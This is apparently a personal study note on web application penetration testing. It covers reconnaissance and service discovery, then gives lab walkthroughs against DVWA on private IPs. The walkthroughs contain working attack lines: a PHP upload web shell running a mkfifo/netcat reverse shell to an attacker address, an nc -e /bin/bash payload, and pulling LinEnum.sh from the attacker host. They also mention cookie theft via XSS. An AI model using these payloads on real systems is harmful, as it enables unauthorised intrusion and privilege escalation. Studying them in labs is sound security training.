OWASP Web test cases
https://docs.google.com/spreadsheets/d/1-XuCzPRRX8fkiw9Lq36A-Aml7iNl4YpbSliqTd535rc/edit#gid=698418753


# WEB HACKING PROCESS STEP WISE

Part-1 - RECONNAISSANCE

* Profile The Infrastructure

Is there a special client necessary to connect to the application? 
What transports does it use? 
Over which ports?
How many servers are there? 
Is there a load balancer? 
What is the make and model of the Web server(s)? 
Are external sites relied on for some functionality? ..etc

# - Server Discovery

- Intution : Discovering web server simply by appending www. or .com/.org/.edu/.gov/.in etc

- Internet Footprinting : the process of creating a complete profile of a target’s information technology infrastructure. It takes into     
                          consideration several possible interfaces on that infrastructure
                          
                          Internet footprinting is primarily carried out using the whois utility, a tool for query-ing various Internet 
                          registration databases

> whois

whois queries the identity of the DNS name servers for an organization. If these servers suffer from a common misconfiguration, they may allow anonymous clients to download the entire contents of a given domain, revealing all of the hostname-to-IP address mapping for that domain.

This functionality is typically restricted to backup DNS servers who store redundant copies of the DNS zone files, but if this restriction is not set, then anyone can dump the zone remotely via a DNS zone transfer.

Performing a DNS zone transfer is simple using the nslookup utility built into most platforms.

> nslookup

C:\>nslookup
:> server ns1.victim.com
:> ls -d victim.com

From this query, we’ve discovered Web servers and other application servers that are accessible via DNS.

> Ping

The most basic approach to server discovery is to send ICMP Echo Requests (typically implemented via the ping utility) to potentially valid hostnames or IP addresses

Since most Internet-connected networks block ping currently, it is rarely an effective server discovery tool.

> Discovery Using Port Scanning

One of the most efficient mechanisms for discovering Web servers is to use port scanning. A port scan attempts to connect to a specific set of TCP and/or UDP ports and determine if a service exists there. If a response is received, then it’s safe to assume that the responding IP address is a “live” address, since it is advertising a viable service on one or more ports.

Depending on the amount of time available, it’s probably more realistic to select a group of ports commonly used by Internet servers and scan for those.

Common TCP and UDP Ports Used for Server Discovery

Protocol Port Service
TCP 21 FTP
TCP 22 SSH
TCP 23 Telnet
TCP 25 SMTP
TCP 53 DNS
TCP 80 HTTP
TCP 110 POP
TCP 111 RPC
TCP 139 NetBIOS Session
TCP 389 LDAP
TCP 443 SSL
TCP 445 SMB
TCP 1433 SQL
TCP 2049 NFS
TCP 3389 Terminal Server
UDP 53 DNS
UDP 69 TFTP
UDP 137 NetBIOS Name
UDP 138 UDP Datagram
UDP 161 SNMP
UDP 500 IKE

* * DEALING WITH LOADBALANCERS AND VIRTUAL SERVERS

Load balancers

If multiple servers are hidden behind one canonical name, then port scans of the canonical name will not include data from every server in the farm, but rather only the one server that is queued up to respond at the time of the scan. Subsequent scans may be directed to other servers.

Virtual servers

One other thing to consider is virtual servers. Some Web hosting companies attempt to spare hardware costs by running different Web servers on multiple virtual IP addresses on the same machine. Be aware that port scan results indicating a large population of live servers at different IP addresses may actually be a single machine with
multiple virtual IP addresses

I still need to find how to diffrentiate in LB and actual server using nmap

> Service Discovery

Once servers have been identified, it’s time to figure out what ports are running HTTP (orSSL as the case may be). We call this process service discovery, and it is carried out using port scanning for a list of common Web server ports. We’ve listed the most common ports used in Web service discovery 

Port Typical HTTP Service
80 World Wide Web standard port
81 Alternate WWW
88 Alternate WWW (also Kerberos)
443 HTTP over SSL (https)
900 IBM Websphere administration client
2301 Compaq Insight Manager
2381 Compaq Insight Manager over SSL
4242 Microsoft Application Center remote management
7001 BEA Weblogic
7002 BEA Weblogic over SSL
7070 Sun Java Web Server over SSL
8000 Alternate Web server, or Web cache
8001 Alternate Web server or management
8005 Apache Tomcat
8080 Alternate Web server, or Squid cache control (cachemgr.cgi),
or Sun Java Web Server
8100 Allaire JRUN
88x0 Ports 8810, 8820, 8830, and so on usually belong to ATG Dynamo
8888 Alternate Web server
9090 Sun Java Web Server admin module
10,000 Netscape Administrator interface (default)

> Banner Grabbing

Server identification is more commonly know as banner grabbing. Banner grabbing is critical to the Web hacker, as it typically identifies the make and model of the Web server software in play.38 Hacking Exposed Web Applications 

Banner grabbing can be performed in parallel with port scanning if the port scanner of choice supports it. We typically use fscan with the -b switch to grab banners while port scanning.

NOTE - Tools like netcat and fscan cannot connect to SSL services in order to grab banners.

# Hacking Webservers

> Apache Server, Microsoft Internet Information Server (IIS), Netscape Enterpise Server

> Bypassing Loadbalancers and Proxy servers

> Automated Vulnerability Scanning Software (Nikto, Webinspect, AppScan)

> DENIAL OF SERVICE AGAINST WEB SERVERS

# Surveying The web Application

The purpose of surveying the application is to generate a complete picture of the content, components, function, and flow of the Web site in order to gather clues about where to find underlying vulnerabilities such as input validation or SQL injection. 

Whereas automated vulnerability checkers typically search for known vulnerable URLs, the goal of an extensive application survey is to see how each of the pieces fit together.

In the end, a proper inspection reveals problems with aspects of the application beyond the presence or absence of certain files or object

> Documenting Application Structure

- click on every link you can find, look for all the menus
- Watch the directory names in the URL change as you navigate. 
- Create a Matrix to docuement
    - Directory
    - Page Name
    - Full Path to the Page
    - Does the Page Require Authentication? 
    - Does the Page Require SSL? 
    - GET/POST Arguments 
    - Comments

> Manually Inspecting the Application

- Statically Generated Pages

Static pages are the generic .html files usually relegated to FAQs and contact information. They may lack functionality to attack with input validation tests, but the HTML source may contain comments or information. At the very least, contact information reveals e-mail addresses and user names.

- Dynamically Generated Pages

Dynamically generated pages (.asp, .jsp, .php, and so on) are more interesting. You can download dynamically generated pages with the “getit” scripts as long as the page does not require a POST request. 

- Directory Structures

Don’t stop at the parts visible through the browser and the site’s menu selections. The Web server may have directories for adminis-
trators, old versions of the site, backup directories, data directories, or other directories that are not referenced in any HTML code. Try to guess the mindset of the administrators. If static content is in the /html directory and dynamic content is in the /jsp directory,
then any cgi scripts may be in the /cgi directory.

NOTE -  Web servers return a non-404 error code when a GET request is made to a directory that exists on the server. The code might be 200, 302, or 401, but as long as it isn’t a 404,
then you’ve discovered a directory.

common directories to check (this is a partial list, as Whisker has an extensive list):

    Directories that have supposedly been secured, either through SSL, authentication, or obscurity: /admin/, /secure/, /adm/

    Directories that contain backup files or log files: /.bak/, /backup/, /back/, /log/, /logs/, /archive/, /old/

    Personal Apache directories: /~root/, /~bob/, /~cthulhu/

    Directories for include files: /include/, /inc/, /js/, /global/, /local/

    Directories used for internationalization: /de/, /en/, /1033/, /fr/

- Robots.txt

The robots.txt file contains a list of directories that search engines such as Google are supposed to index or ignore. 

A file like this is a gold mine! The “Disallow” tags instruct a cooperative spidering tool to ignore the directory. Tools and search engines rarely do. The point is, a robots.txt file provides an excellent snapshot of the directory structure

- Helper Files

Helper file is a catchall appellation for any file that supports the application, but usually does not appear in the URL

    - CSS files
    - XML Style Sheets
    - Javascript Files
    - Include Files

On IIS systems, include files (.inc) often control database access or contain variables used internally by the application. Programmers love to
place database connection strings in this file, password and all!

    - Others 

References to ASP, PHP, Perl, text, and other files might be inthe HTML source.

- Java Classess and Applets

If you can download the Java classes or compiled servlets, then you can actually pick apart an application from the inside. 

Imagine if an application used a custom encryption scheme written in a Java servlet. Now, imagine you can download that servlet and peek inside the code

Java is designed to be a write once, run anywhere language. A significant byproduct of this is that you can actually decompile a Java class back into the original source code.

It can be difficult to obtain the actual Java class, but try a few tricks such as:

    - Append .java or .class to a Servlet Name For example, if the site uses a servlet called “/servlet/LogIn” then look for “/servlet/LogIn.class”.

    - Search for Servlets in Backup Directories If a servlet is in a directory that the servlet engine does not recognize as executable, then you can retrieve the actual file instead of receiving its output.

    - Search for Common Test Servlets SessionServlet, AdminServlet, SnoopServlet, Test. Note that many servlet engines are case-sensitive so you will have to type the name exactly.

- HTML comments and Content

- Forms (Method used, scripts called in Action, Maxlength/input restrictions, Hidden feilds, Autocomplete applied?,)

- Query Strings

    - User Identification - Look for values that represent the user.
    - Session Identification - Look for values that remain constant for an entire session.
    - Database Queries - Inspect the URL for any values that appear to be passed into a database.
    - Search Queries -  search page always accepts a string for the user’s query. It may also take hidden fields or hard-coded values 
    - File Access - Do the argument values appear to be filenames?
    - Others - try arguments like (debug, dbg, admin, source, show etc)

- Backend Connectivity

    - Note when information is read from or written to the database (such as updating address information or changing the password).
    - Highlight pages or comments within pages that directly relate to a database or other systems.
    - A misconfigured server could allow anyone to upload, delete, modify, or browse the Web document root. Check to see if they are enabled

- Server Headers

    - The HTTP headers returned by the Web server also reveal the operating system, Web server version, and additional modules.


PART-2 Attack 

> Atttacking Web Authentication

- Password guessing

- Session Id Prediction and Brute Forcing

Since the session ID can be used in lieu of a username and password combination, providing a valid session ID in a request would allow a hacker to perform session hijacking or replay attacks if the session ID is captured or guessed. The two techniques used to perform session hijacking are session ID prediction and brute forcing

    - Predicting as Session id is not uniqu and randomly generated

    - Making Thousands of request using all possible session IDs

- Subverting cookies

    - Clinet Side script injection - stealing cookie by injecting scripts in browser

    - Evesdropping using a sniffer

    - bit-flipping attack -  This attack works by first using a valid cookie, and methodically modifying bits to see if the cookie is still valid  
                             and whether dif-ferent access is gained. The success of this attack depends on how the cookie is com- prised, and whether there are any redundancy checks in the cookie
- SQLi

> Bypassing Authentication

- User input validation attacks
- SQLi
- impersonate as other user using other techqniqes

> Attackking Web Authorization

- The Attacks

    - Horizontal Privilage Esclation    -   Access a Peer's information

    - Vertical Privilage Esclation  -   Access a elevated user's information

    - Arbitrary Files Access    -   Accessing files restricted from users

- Methodology

    - Modify Query Strings, POST data, Hidden Tags, URI, HTTP Header, Cookies












************************************************************************************************************************************************
# Service scanning / Enumeration / Recon

The first thing we need to do is identify the operating system and any available services that might be running.The services running on these computers may be assigned a port number to make the service accessible.

Manually examining all of the 65,535 ports for any available services would be laborious,One of the most commonly used scanning tools is Nmap(Network Mapper).

* Nmap (Network Mapper)


# Banner Grabbing / Web Server Headers

Banner grabbing is a useful technique to fingerprint a service quickly. Often a service will look to identify itself by displaying a banner once a connection is initiated

Nmap will attempt to grab the banners 

- nmap -sV --script=banner <target>

We can also attempt this manually using Netcat.

- nc -nv 10.129.42.253 21

We can use cURL to retrieve server header information from the command line. cURL is another essential addition to our penetration testing toolkit, and familiarity with its many options is encouraged.

- curl -IL https://www.inlanefreight.com

We can extract the version of web servers, supporting frameworks, and applications using the command-line tool whatweb. Whatweb is a handy tool and contains much functionality to automate web application enumeration across a network.

- whatweb 10.10.10.121
- whatweb --no-errors 10.10.10.0/24


# Public Exploits

Once we identify the services running on ports identified from our Nmap scan, the first step is to look if any of the applications/services have any public exploits. Public exploits can be found for web applications and other applications running on open ports, like SSH or ftp.

We can also utilize online exploit databases to search for vulnerabilities, like Exploit DB, Rapid7 DB, or Vulnerability Lab. 

* Metasploit Primer


# Tranferring Files

During any penetration testing exercise, it is likely that we will need to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host (victim machine).

While tools like Metasploit with a Meterpreter shell allow us to use the Upload command to upload a file, we need to learn methods to transfer files with a standard reverse shell.

* Using Python HTTP server and Wget/cURL

First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:

- cd /tmp
- python3 -m http.server 8000

Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:

- wget http://10.10.14.1:8000/linenum.sh

If the remote server does not have wget, we can use cURL to download the file:

the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to base64 encode the file into base64 format, and then we can paste the base64 string on the remote server and decode it.

* Validating File Transfered

To validate the format of a file, we can run the file command on it:

- user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header

As we can see, when we run the file command on the shell file, it says that it is an ELF binary, meaning that we successfully transferred it.

we can see, files have the same md5 on host and remote server

- md5sum file

# Example approach

approach 1

Step 1. Enumeration
 
* Scan for open ports using Nmap

- nmap -sC -sV -v --open -p- -oA test 192.168.46.129

- suppose you exploited any command injection or file upload vul and now you got reverse web shell using netcat

Step 2. Footprint

(We can use whatweb to try to identify the web application in use.)

- whatweb 192.168.46.129 --no-errors

(We can also use Curl)

- curl 192.168.46.129

we find that there is a dvwa dir

now we need to attempt to turn this access into code execution and ultimately gain reverse shell access to the webserver. 

try sample code <?php system('id); ?> and try to access file http://192.168.46.129/dvwa/hackable/uploads/test.php

now upload file and get reverse shell by listetning on 1234

<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.46.128 1234 >/tmp/f"); ?>

do it using cURL - curl 192.168.46.129/dvwa/hackable/uploads/test.php


Step 3. Privilage Esclation

Now that we have a reverse shell connection, it is time to escalate privileges. so pull in LinEnum.sh to perform some automated privilege escalation checks.

download LinEnum.sh and start python http server then Wget from target to pull this file, Once the script is pulled over, type chmod +x LinEnum.sh to make the script executable and then type ./LinEnum.sh to run it. 

- python3 -m http.server 8080.
- wget http://<your ip>:8080/LinEnum.sh

now use your reverse shell 

- chmod +x LinEnum.sh 
- ./LinEnum.sh



approach 2

* Get access to shell by creating backdoor by reverse web shell

you are listenting on 8000 - nc -nlvkp 8000
your reverse shell payload contains - nc -e "/bin/bash" 192.168.46.128 8000


* Scan the services and ports

you then got access to shell now you can shell


approach 3

get remote code execution using XSS on demo.testfire then get into the detais and do the privilage esclation

first steal the cookies and use them in curl